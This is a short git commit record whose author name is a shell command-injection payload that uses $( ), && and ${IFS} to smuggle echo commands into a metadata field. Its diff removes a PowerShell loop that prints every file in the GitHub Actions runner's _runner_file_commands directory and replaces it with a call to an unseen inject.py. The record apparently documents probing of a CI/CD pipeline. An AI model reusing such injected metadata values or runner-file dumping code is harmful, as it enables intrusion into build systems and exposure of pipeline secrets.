e644d452368b078c788d34847d21b9c25154dbbd
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 02:27:07 -0400

    Update script.ps1

--- src/script.ps1
+++ src/script.ps1
@@ -1,5 +1,1 @@
-Get-ChildItem -Path "D:\a\_temp\_runner_file_commands\" -Recurse -File | ForEach-Object {
-    $filePath = $_.FullName
-    Write-Host "File: $filePath"
-    Get-Content -Path $filePath
-}
+python3 inject.py
